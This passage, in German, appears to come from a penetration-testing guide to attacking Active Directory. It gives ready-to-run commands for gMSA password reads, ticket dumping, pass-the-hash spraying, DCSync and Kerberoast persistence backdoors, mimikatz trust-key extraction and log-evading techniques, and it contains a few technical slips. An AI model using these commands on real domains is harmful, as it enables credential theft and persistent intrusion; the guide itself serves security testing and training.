Ein fehlgeschlagener Default-/NTLM-Bind macht diesen Befund **nicht** ungültig: Teste mit `-k`, einem FQDN, der zur DC aufgelöst wird, und einer mit dem KDC synchronisierten Uhr. Erfolgreiche Modulläufe schreiben Kandidatenlisten und erworbene ccaches unter `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nachdem du den Computer-Prinzipal kompromittiert hast, ermittle seine verschachtelten Gruppenmitgliedschaften und ausgehenden Berechtigungen. Insbesondere können die in einem Sicherheitsdeskriptor von `msDS-GroupMSAMembership` einer gMSA genannten Prinzipale `msDS-ManagedPassword` lesen; die Ausgabe von NetExec mit `--gmsa` zeigt die zulässigen Prinzipale und gibt den aktuellen NT-Hash zurück, wenn der authentifizierende Computer autorisiert ist.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Bewerte die wiederhergestellte gMSA anschließend wie jede andere Zugangsinformation: Prüfe lokale und Domänengruppenmitgliedschaften, Anmelderechte, SPNs, Delegation und erreichbare Dienste, bevor du pass-the-hash ausprobierst. Dieser ACL-basierte Abrufpfad unterscheidet sich von [Golden gMSA/dMSA](golden-dmsa-gmsa.md), bei dem verwaltete Passwörter nach einer Kompromittierung des KDS-Root-Keys abgeleitet werden.<sup>[[20]](#references)</sup>

Ein Computerprinzipal kann auch ausgehende Kontrolle über andere Computerobjekte oder Gruppen haben. Untersuche nach dem Zugriff separat seine verschachtelten Mitgliedschaften und effektiven ACLs: Ein Schreibrecht auf ein anderes Computerobjekt kann eine Kontoänderung ermöglichen, und Gruppenmitgliedschaftsrechte können zu einer Anmelderolle führen. Ein Flag für ein bereitgestelltes Konto, eine vorhersehbare Namenskonvention oder allein eine `GenericWrite`-Kante beweist nicht den vollständigen Angriffspfad.

Eine lesbare Kopie eines `msDS-ManagedPassword`-Blobs in einer Datei, Freigabe oder Sicherung ist ein separater Offenlegungspfad: Die LDAP-Lese-ACL schützt keine Kopie, die anderswo gespeichert ist. Prüfe, ob es sich bei den Daten tatsächlich um einen verwalteten Passwort-Blob handelt, bevor du sie interpretierst, und unterscheide dies sowohl von einem autorisierten LDAP-Lesezugriff als auch von der Ableitung über den KDS-Root-Key.

### Kerberoast

Beim Kerberoasting werden **TGS-Tickets** abgerufen, die von Diensten verwendet werden, die an Benutzerkonten gebunden sind, und deren Verschlüsselung – die auf Benutzerpasswörtern basiert – **offline** geknackt.

Mehr dazu hier:


{{#ref}}
kerberoast.md
{{#endref}}

### Remoteverbindung (RDP, SSH, FTP, Win-RM usw.)

Sobald du Zugangsdaten erhalten hast, kannst du prüfen, ob du Zugriff auf irgendeinen **Computer** hast. Dazu kannst du **CrackMapExec** verwenden, um anhand deiner Portscans mit verschiedenen Protokollen Verbindungen zu mehreren Servern herzustellen.

### Lokale Rechteausweitung

Wenn du Zugangsdaten oder eine Sitzung als regulärer Domänenbenutzer kompromittiert hast und auf **einen beliebigen Computer in der Domäne** zugreifen kannst, suche nach einem Weg, **lokal Rechte auszuweiten und Zugangsdaten zu sammeln**. Lokale Administratorrechte können es dir ermöglichen, **die Hashes anderer Benutzer** aus dem Arbeitsspeicher (LSASS) und dem lokalen Speicher (SAM) **auszulesen**.

Dieses Buch enthält eine vollständige Seite über [**lokale Rechteausweitung in Windows**](../windows-local-privilege-escalation/index.html) sowie eine [**Checkliste**](../checklist-windows-privilege-escalation.md). Vergiss auch nicht, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Tickets der aktuellen Sitzung

Es ist sehr **unwahrscheinlich**, dass du **Tickets** in der aktuellen Benutzersitzung findest, die dir **Zugriff auf** unerwartete Ressourcen **gewähren**. Du kannst dies aber prüfen:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Mit Domain-Credentials oder einer Benutzersitzung solltest du NTLM-[**Relay-Angriffe**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erneut untersuchen: Authentifizierte Enumeration und Coercion-Techniken können Relay-Pfade offenlegen, die bei der nicht authentifizierten Reconnaissance nicht verfügbar waren.

### Nach Credentials in Computer-Shares | SMB-Shares suchen

Da du jetzt einige grundlegende Credentials hast, solltest du prüfen, ob du **interessante Dateien finden kannst, die innerhalb der AD freigegeben sind**. Du könntest das manuell erledigen, aber es ist eine sehr langweilige, repetitive Aufgabe (vor allem, wenn du Hunderte Dokumente findest, die du überprüfen musst).

[**Folge diesem Link, um mehr über Tools zu erfahren, die du verwenden kannst.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM-Credentials stehlen

Wenn du **auf andere PCs oder Shares zugreifen kannst**, könntest du **Dateien platzieren** (zum Beispiel eine SCF-Datei), die bei einem Zugriff eine **NTLM-Authentifizierung bei dir auslösen**, sodass du die **NTLM-Challenge stehlen** und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle ermöglichte es jedem authentifizierten Benutzer, den **Domain Controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege Escalation in Active Directory MIT privilegierten Credentials/einer privilegierten Sitzung

**Für die folgenden Techniken reicht ein regulärer Domain-Benutzer nicht aus. Du benötigst spezielle Privilegien/Credentials, um diese Angriffe durchzuführen.**

### Hash-Extraktion

Hoffentlich ist es dir gelungen, einen **lokalen Admin-Account zu kompromittieren**, etwa mit [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich Relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) oder durch [lokale Privilege Escalation](../windows-local-privilege-escalation/index.html).\
Dann ist es an der Zeit, alle Hashes im Speicher und lokal zu dumpen.\
[**Lies auf dieser Seite mehr über verschiedene Möglichkeiten, die Hashes zu erhalten.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Benutzers hast**, kannst du ihn verwenden, um dich als dieser Benutzer **auszugeben**.\
Du musst ein **Tool** verwenden, das die **NTLM-Authentifizierung mit** diesem **Hash durchführt**, **oder** du kannst einen neuen **sessionlogon** erstellen und den **Hash** in die **LSASS** injizieren, sodass dieser Hash verwendet wird, wenn eine **NTLM-Authentifizierung durchgeführt wird**. Die letzte Option ist das, was mimikatz macht.\
[**Lies diese Seite für weitere Informationen.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bei diesem Angriff wird der **NTLM-Hash des Benutzers verwendet, um Kerberos-Tickets anzufordern**. Das ist eine Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders **nützlich in Netzwerken sein, in denen das NTLM-Protokoll deaktiviert ist** und **nur Kerberos** als Authentifizierungsprotokoll **zugelassen ist**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer das Authentifizierungsticket eines Benutzers** statt dessen Passwort oder Hash-Werte. Dieses gestohlene Ticket wird dann verwendet, um sich **als der Benutzer auszugeben** und unbefugten Zugriff auf Ressourcen und Dienste innerhalb eines Netzwerks zu erhalten.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Wiederverwendung von Credentials

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrators** hast, solltest du versuchen, dich damit **lokal** bei anderen **PCs** anzumelden.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Beachte, dass dies ziemlich **auffällig** ist und durch **LAPS** **abgemildert** würde.

### MSSQL-Missbrauch & vertrauenswürdige Verknüpfungen

Wenn ein Benutzer über Berechtigungen zum **Zugriff auf MSSQL-Instanzen** verfügt, kann er möglicherweise **Befehle** auf dem MSSQL-Host **ausführen** (wenn dieser als SA läuft), den NetNTLM-**Hash stehlen** oder sogar einen **Relay-Angriff** durchführen.\
Wenn einer MSSQL-Instanz über einen Datenbanklink von einer anderen Instanz vertraut wird, kann ein Benutzer mit Berechtigungen für die verknüpfte Datenbank möglicherweise **die Vertrauensbeziehung nutzen, um Abfragen auf der anderen Instanz auszuführen**. Diese Vertrauensbeziehungen können verkettet werden und schließlich zu einer falsch konfigurierten Datenbank führen, auf der der Benutzer Befehle ausführen kann.\
**Die Verknüpfungen zwischen Datenbanken funktionieren auch über Forest-Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Missbrauch von IT-Asset- und Deployment-Plattformen

Inventarisierungs- und Deployment-Suites von Drittanbietern eröffnen oft mächtige Wege zu Zugangsdaten und Codeausführung. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computerobjekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und über Domänenberechtigungen auf dem Computer verfügst, kannst du die TGTs aller Benutzer aus dem Speicher auslesen, die sich am Computer anmelden.\
Wenn sich also ein **Domain Admin am Computer anmeldet**, kannst du sein TGT auslesen und ihn mit [Pass the Ticket](pass-the-ticket.md) imitieren.\
Dank Constrained Delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich handelt es sich dabei um einen DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn ein Benutzer oder Computer für „Constrained Delegation“ zugelassen ist, kann er **jeden Benutzer imitieren, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn du dann den **Hash dieses Benutzers/Computers kompromittierst**, kannst du **jeden Benutzer** (sogar Domain Admins) imitieren, um auf bestimmte Dienste zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Mit **WRITE**-Berechtigungen für ein Active-Directory-Objekt eines Remotecomputers lässt sich Code mit **erweiterten Berechtigungen** ausführen:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Missbrauch von Berechtigungen/ACLs

Der kompromittierte Benutzer könnte **interessante Berechtigungen für bestimmte Domänenobjekte** haben, mit denen du dich lateral **bewegen** oder deine Berechtigungen **ausweiten** kannst.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Missbrauch des Printer Spooler-Dienstes

Ein **im Netzwerk lauschender Spooler-Dienst** kann **missbraucht** werden, um **neue Zugangsdaten zu erlangen** und **Berechtigungen auszuweiten**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Missbrauch von Sitzungen Dritter

Wenn **andere Benutzer** auf den **kompromittierten** Computer **zugreifen**, lassen sich möglicherweise **Zugangsdaten aus dem Speicher auslesen** und sogar **Beacons in ihre Prozesse einschleusen**, um sie zu imitieren.\
Benutzer greifen üblicherweise per RDP auf das System zu. Hier erfährst du, wie du einige Angriffe auf RDP-Sitzungen Dritter durchführst:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bietet ein System zur Verwaltung des **lokalen Administratorpassworts** auf in die Domäne eingebundenen Computern und stellt sicher, dass es **zufällig**, eindeutig und regelmäßig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert; der Zugriff darauf wird über ACLs ausschließlich autorisierten Benutzern gewährt. Mit ausreichenden Berechtigungen für den Zugriff auf diese Passwörter wird ein Wechsel zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Zertifikatdiebstahl

Das **Sammeln von Zertifikaten** auf dem kompromittierten Computer kann eine Möglichkeit sein, Berechtigungen innerhalb der Umgebung auszuweiten:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Missbrauch von Zertifikatvorlagen

Wenn **verwundbare Vorlagen** konfiguriert sind, lassen sie sich möglicherweise missbrauchen, um Berechtigungen auszuweiten:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation mit einem Konto mit hohen Berechtigungen

### Domänen-Credentials dumpen

Sobald du über **Domain Admin**- oder, noch besser, **Enterprise Admin**-Berechtigungen verfügst, kannst du die **Domänendatenbank** _ntds.dit_ **dumpen**.

[**Weitere Informationen zum DCSync-Angriff findest du hier**](dcsync.md).

[**Weitere Informationen zum Stehlen der NTDS.dit findest du hier**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Ein lesbares Backup-Archiv mit `ntds.dit` und dem `SYSTEM`-Hive sollte bereits vor dem Entpacken als offengelegtes Domänenmaterial behandelt werden. Ein veralteter Passwort-Hash macht andere Objektattribute nicht sicher: Felder wie `description` können Zugangsdaten oder operative Hinweise enthalten. Prüfe zuerst die Namen der Archivdateien und gib den Inhalt der entpackten Datenbank nicht in routinemäßigen Enumerationsausgaben aus.

### Privesc als Persistence

Einige der zuvor besprochenen Techniken lassen sich für Persistence verwenden.\
Zum Beispiel könntest du:

- Benutzer für [**Kerberoast**](kerberoast.md) verwundbar machen

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Benutzer für [**ASREPRoast**](asreproast.md) anfällig machen

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Einem Benutzer [**DCSync**](#dcsync)-Berechtigungen gewähren

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

Der **Silver-Ticket-Angriff** erstellt mithilfe des **NTLM-Hashes** (zum Beispiel des **Hashes des PC-Kontos**) ein **gültiges Ticket Granting Service (TGS)-Ticket** für einen bestimmten Dienst. Diese Methode wird verwendet, um **auf die Berechtigungen des Dienstes zuzugreifen**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bei einem **Golden-Ticket-Angriff** verschafft sich ein Angreifer Zugriff auf den **NTLM-Hash des krbtgt-Kontos** in einer Active-Directory-Umgebung (AD). Dieses Konto ist besonders, weil es zum Signieren aller **Ticket Granting Tickets (TGTs)** verwendet wird, die für die Authentifizierung im AD-Netzwerk erforderlich sind.

Sobald der Angreifer diesen Hash erlangt hat, kann er **TGTs** für beliebige Konten erstellen (Silver-Ticket-Angriff).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese Tickets ähneln Golden Tickets, werden jedoch so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Zertifikatsbasierte Kontopersistenz**

**Besitzt man Zertifikate eines Kontos oder kann sie beantragen**, ist das eine sehr gute Möglichkeit, im Konto eines Benutzers persistenten Zugriff zu behalten (selbst wenn er sein Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Zertifikatsbasierte Domänenpersistenz**

**Mit Zertifikaten lässt sich auch mit hohen Berechtigungen innerhalb der Domäne Persistenz erreichen:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder-Gruppe

Das **AdminSDHolder**-Objekt in Active Directory schützt **privilegierte Gruppen** (wie Domain Admins und Enterprise Admins), indem es auf diese Gruppen eine standardisierte **Access Control List (ACL)** anwendet, um unbefugte Änderungen zu verhindern. Dieses Feature kann jedoch ausgenutzt werden: Ändert ein Angreifer die ACL von AdminSDHolder so, dass ein regulärer Benutzer Vollzugriff erhält, erlangt dieser Benutzer umfassende Kontrolle über alle privilegierten Gruppen. Diese Schutzmaßnahme kann sich somit ins Gegenteil verkehren und unberechtigten Zugriff ermöglichen, wenn sie nicht genau überwacht wird.

[**Weitere Informationen zur AdminDSHolder-Gruppe findest du hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM-Anmeldedaten

Auf jedem **Domain Controller (DC)** existiert ein **lokales Administratorkonto**. Erlangt man Administratorrechte auf einem solchen Computer, kann der Hash des lokalen Administrators mit **mimikatz** extrahiert werden. Anschließend muss die Registrierung geändert werden, um **die Verwendung dieses Passworts zu aktivieren** und so den Fernzugriff auf das lokale Administratorkonto zu ermöglichen.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL-Persistenz

Du kannst einem **Benutzer** bestimmte **Spezialberechtigungen** für ausgewählte Domänenobjekte **erteilen**, mit denen der Benutzer **später seine Berechtigungen erweitern kann**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Sicherheitsdeskriptoren

**Sicherheitsdeskriptoren** speichern die **Berechtigungen**, die ein **Objekt** gegenüber einem **anderen Objekt** hat. Wenn du eine **kleine Änderung** am **Sicherheitsdeskriptor** eines Objekts vornehmen kannst, kannst du sehr interessante Berechtigungen für dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamische Objekte: Anti-Forensik / Umgehung

Missbrauche die Hilfsklasse `dynamicObject`, um kurzlebige Principals/GPOs/DNS-Einträge mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen. Sie löschen sich selbst, ohne Tombstones zu hinterlassen, und beseitigen so LDAP-Spuren, während verwaiste SIDs, ungültige `gPLink`-Verweise oder zwischengespeicherte DNS-Antworten zurückbleiben (z. B. mit AdminSDHolder-ACE-Verschmutzung oder bösartigen `gPCFileSysPath`-/AD-integrierten DNS-Umleitungen).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Arbeitsspeicher, um ein **universelles Passwort** einzurichten, das Zugriff auf alle Domänenkonten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Hier erfährst du, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst dein **eigenes SSP** erstellen, um die für den Zugriff auf den Computer verwendeten **Anmeldedaten** im **Klartext** **abzufangen**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dabei wird ein **neuer Domain Controller** in AD registriert und verwendet, um **Attribute** (SIDHistory, SPNs...) auf bestimmten Objekten zu **ändern**, ohne **Protokolleinträge** zu den **Änderungen** zu hinterlassen. Dafür benötigst du **DA**-Berechtigungen und musst dich innerhalb der **Stammdomäne** befinden.\
Beachte, dass bei Verwendung falscher Daten sehr unschöne Protokolleinträge entstehen.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS-Persistenz

Wir haben bereits besprochen, wie man Berechtigungen erweitern kann, wenn man **über ausreichende Berechtigungen zum Auslesen von LAPS-Passwörtern verfügt**. Diese Passwörter können jedoch auch zur **Aufrechterhaltung der Persistenz** verwendet werden.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Berechtigungserweiterung im Forest – Domain Trusts

Microsoft betrachtet den **Forest** als Sicherheitsgrenze. Das bedeutet, dass **die Kompromittierung einer einzelnen Domäne potenziell zur Kompromittierung des gesamten Forests führen kann**.<sup>[[1]](#references)</sup>

### Grundlegende Informationen

Ein [**Domain Trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der einem Benutzer aus einer **Domäne** den Zugriff auf Ressourcen in einer anderen **Domäne** ermöglicht. Im Wesentlichen verbindet er die Authentifizierungssysteme der beiden Domänen, sodass Authentifizierungsprüfungen nahtlos weitergegeben werden können. Wenn Domänen einen Trust einrichten, tauschen sie bestimmte **Schlüssel** aus und speichern sie auf ihren **Domain Controllern (DCs)**. Diese Schlüssel sind entscheidend für die Integrität des Trusts.

In einem typischen Szenario muss ein Benutzer, der auf einen Dienst in einer **vertrauenswürdigen Domäne** zugreifen möchte, zunächst beim DC seiner eigenen Domäne ein spezielles Ticket anfordern, ein sogenanntes **Inter-Realm-TGT**. Dieses TGT wird mit einem gemeinsamen **Schlüssel** verschlüsselt, auf den sich beide Domänen geeinigt haben. Anschließend legt der Benutzer dieses TGT beim **DC der vertrauenswürdigen Domäne** vor, um ein Service-Ticket (**TGS**) zu erhalten. Nachdem der DC der vertrauenswürdigen Domäne das Inter-Realm-TGT erfolgreich validiert hat, stellt er ein TGS aus, das dem Benutzer Zugriff auf den Dienst gewährt.

**Schritte**:

1. Ein **Clientcomputer** in **Domäne 1** startet den Vorgang, indem er mit seinem **NTLM-Hash** bei seinem **Domain Controller (DC1)** ein **Ticket Granting Ticket (TGT)** anfordert.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Anschließend fordert der Client bei DC1 ein **Inter-Realm-TGT** an, das für den Zugriff auf Ressourcen in **Domäne 2** erforderlich ist.
4. Das Inter-Realm-TGT wird mit einem **Trust-Schlüssel** verschlüsselt, den DC1 und DC2 im Rahmen des zweiseitigen Domain Trusts gemeinsam verwenden.
5. Der Client übermittelt das Inter-Realm-TGT an den **Domain Controller (DC2) von Domäne 2**.
6. DC2 überprüft das Inter-Realm-TGT mit seinem gemeinsamen Trust-Schlüssel und stellt bei erfolgreicher Prüfung ein **Ticket Granting Service (TGS)** für den Server in Domäne 2 aus, auf den der Client zugreifen möchte.
7. Schließlich legt der Client dieses TGS dem Server vor. Es ist mit dem Hash des Serverkontos verschlüsselt und gewährt Zugriff auf den Dienst in Domäne 2.

### Verschiedene Trusts

Es ist wichtig zu beachten, dass ein **Trust unidirektional oder bidirektional sein kann**. Bei bidirektionalen Trusts vertrauen beide Domänen einander. Bei einem **unidirektionalen** Trust ist eine Domäne die **vertrauenswürdige**, die andere die **vertrauende** Domäne. Im letzteren Fall kannst du **nur von der vertrauenswürdigen Domäne aus auf Ressourcen in der vertrauenden Domäne zugreifen**.

Wenn Domäne A Domäne B vertraut, ist A die vertrauende und B die vertrauenswürdige Domäne. Außerdem handelt es sich in **Domäne A** um einen **Outbound Trust** und in **Domäne B** um einen **Inbound Trust**.

**Verschiedene Trust-Beziehungen**

- **Parent-Child-Trusts**: Dies ist eine gängige Konfiguration innerhalb desselben Forests, bei der eine untergeordnete Domäne automatisch einen transitiven bidirektionalen Trust zu ihrer übergeordneten Domäne hat. Das bedeutet, dass Authentifizierungsanfragen nahtlos zwischen der übergeordneten und der untergeordneten Domäne weitergegeben werden können.
- **Cross-Link-Trusts**: Diese als „Shortcut Trusts“ bezeichneten Trusts werden zwischen untergeordneten Domänen eingerichtet, um Weiterleitungsprozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungsverweise normalerweise bis zur Forest-Stammdomäne und anschließend wieder hinunter zur Zieldomäne weitergeleitet werden. Cross-Links verkürzen diesen Weg, was besonders in geografisch verteilten Umgebungen von Vorteil ist.
- **External Trusts**: Diese werden zwischen verschiedenen, nicht miteinander verbundenen Domänen eingerichtet und sind von Natur aus nicht transitiv. Laut der [Dokumentation von Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind External Trusts nützlich, um auf Ressourcen in einer Domäne außerhalb des aktuellen Forests zuzugreifen, die nicht durch einen Forest Trust verbunden ist. Bei External Trusts erhöht SID Filtering die Sicherheit.
- **Tree-root-Trusts**: Diese Trusts werden automatisch zwischen der Forest-Stammdomäne und einer neu hinzugefügten Tree-Stammdomäne eingerichtet. Obwohl sie nicht häufig vorkommen, sind Tree-root-Trusts wichtig, um neue Domänenbäume zu einem Forest hinzuzufügen. So können diese einen eindeutigen Domänennamen beibehalten und zugleich eine bidirektionale Transitivität gewährleisten. Weitere Informationen findest du im [Leitfaden von Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Dieser Trust-Typ ist ein bidirektionaler transitiver Trust zwischen den Stammdomänen zweier Forests und setzt ebenfalls SID Filtering ein, um die Sicherheit zu erhöhen.
- **MIT Trusts**: Diese Trusts werden mit Nicht-Windows-Kerberos-Domänen eingerichtet, die [RFC4120-konform](https://tools.ietf.org/html/rfc4120) sind. MIT Trusts sind spezieller und eignen sich für Umgebungen, in denen eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems erforderlich ist.

#### Weitere Unterschiede bei **Trust-Beziehungen**

- Eine Trust-Beziehung kann außerdem **transitiv** sein (A vertraut B, B vertraut C, also vertraut A auch C) oder **nicht transitiv**.
- Eine Trust-Beziehung kann als **bidirektionaler Trust** (beide vertrauen einander) oder als **unidirektionaler Trust** (nur eine Domäne vertraut der anderen) eingerichtet werden.

### Angriffspfad

1. **Ermittle** die Trust-Beziehungen.
2. Prüfe, ob ein **Security Principal** (Benutzer/Gruppe/Computer) **Zugriff** auf Ressourcen der **anderen Domäne** hat, etwa über ACE-Einträge oder durch die Mitgliedschaft in Gruppen der anderen Domäne. Suche nach **domänenübergreifenden Beziehungen** (wahrscheinlich wurde der Trust genau dafür eingerichtet).
   1. In diesem Fall könnte auch Kerberoasting eine Option sein.
3. **Kompromittiere** die **Konten**, mit denen du zwischen Domänen **wechseln** kannst.

Angreifer können auf drei hauptsächliche Arten auf Ressourcen in einer anderen Domäne zugreifen:

- **Mitgliedschaft in lokalen Gruppen**: Principals können zu lokalen Gruppen auf Computern hinzugefügt werden, etwa zur Gruppe „Administrators“ auf einem Server, wodurch sie umfangreiche Kontrolle über diesen Computer erhalten.
- **Mitgliedschaft in Gruppen einer fremden Domäne**: Principals können auch Mitglied von Gruppen innerhalb der fremden Domäne sein. Wie wirksam diese Methode ist, hängt jedoch von der Art des Trusts und dem Geltungsbereich der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** aufgeführt sein, insbesondere als Einträge in **ACEs** innerhalb einer **DACL**, und dadurch Zugriff auf bestimmte Ressourcen erhalten. Wer sich näher mit der Funktionsweise von ACLs, DACLs und ACEs befassen möchte, findet im Whitepaper „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)“ eine wertvolle Informationsquelle.<sup>[[17]](#references)</sup>

### Externe Benutzer/Gruppen mit Berechtigungen finden

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** überprüfen, um externe Security Principals in der Domäne zu finden. Dabei handelt es sich um Benutzer/Gruppen aus **einer externen Domäne/einem externen Forest**.

Du kannst dies in **Bloodhound** oder mit PowerView prüfen:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Rechteausweitung vom Child- zum Parent-Forest

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Andere Möglichkeiten, Domänenvertrauensstellungen aufzuzählen:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Es gibt **2 vertrauenswürdige Schlüssel**, einen für _Child --> Parent_ und einen weiteren für _Parent_ --> _Child_.\
> Den vom aktuellen Domain verwendeten Schlüssel können Sie mit folgendem Befehl anzeigen:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Als Enterprise Admin in die Child-/Parent-Domain eskalieren, indem das Trust-Verhältnis mit SID-History Injection missbraucht wird:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Writeable Configuration NC ausnutzen

Es ist entscheidend zu verstehen, wie der Configuration Naming Context (NC) ausgenutzt werden kann. Der Configuration NC dient in Active Directory (AD)-Umgebungen als zentrales Repository für Konfigurationsdaten im gesamten Forest. Diese Daten werden auf jeden Domain Controller (DC) innerhalb des Forest repliziert, wobei writable DCs eine beschreibbare Kopie des Configuration NC verwalten. Um dies auszunutzen, benötigt man **SYSTEM-Berechtigungen auf einem DC**, vorzugsweise einem Child DC.

**GPO mit der Root-DC-Site verknüpfen**

Der Sites-Container des Configuration NC enthält Informationen zu den Sites aller in die Domain eingebundenen Computer im AD-Forest. Mit SYSTEM-Berechtigungen auf einem beliebigen DC können Angreifer GPOs mit den Root-DC-Sites verknüpfen. Dadurch kann die Root-Domain potenziell kompromittiert werden, indem die auf diese Sites angewendeten Richtlinien manipuliert werden.

Ausführliche Informationen finden sich in der Forschung zu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Beliebige gMSA im Forest kompromittieren**

